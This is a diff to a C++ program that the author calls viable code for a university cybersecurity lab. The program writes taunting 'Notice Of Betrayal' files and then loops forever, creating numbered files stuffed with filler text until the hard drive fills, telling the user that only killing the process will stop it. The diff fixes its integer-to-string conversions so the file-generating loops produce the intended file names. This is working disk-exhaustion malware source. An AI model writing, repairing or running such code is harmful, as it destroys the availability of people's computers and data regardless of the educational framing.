@@ -1,9 +1,9 @@
 //COMMENTS
-//I was going to release an executable for the C++ program below... I thought the better of it!... But there is no point in wasting an opportunity for perfectly viable code to be used purely for educative purposes, and only in a computer science cybersecurity class/lab at university.
+//I was going to release an executable for the C++ program below... I thought the better of it!... But there is no point in wasting an opportunity for perfectly viable code to be used purely for educative purposes, and only in a computer science cybersecurity class / lab at university.
 
 #include <iostream>
 #include <fstream>
-#include <string.h>
+#include <string>
 
 
 using namespace std;
@@ -43,7 +43,7 @@ int main()
         while (x < 2)
         {
             x = (x + 1);
-            x_Character = x;
+            x_Character = to_string(x);
             fstream file;
             file.open(("Notice Of Betrayal" + x_Character + ".txt"), ios::out);
             file << "You betrayed me!... Double the severity!... 40 times the length!";
@@ -70,14 +70,14 @@ int main()
                 std::cout << '\n';
                 std::cout << "Do not close this powershell window now that eternal ether mode is reached... otherwise you will be unaware that your hard drive is filling up during this windows 10 session." << '\n';
                 std::cout << "TO STOP THIS PROGRAM, YOU MUST FIRST KILL THE PROCESS IN THE TASK MANAGER!!!!!";
-                
+
 
                 long y = 0;
                 std::string y_Character;
                 while (1 == 1)
                 {
                     y = (y + 1);
-                    y_Character = y;
+                    y_Character = to_string(y);
                     fstream file;
                     file.open(("Eternal_Ether" + y_Character + ".txt"), ios::out);
                     file << "8888888888888888888888888888888888888888";
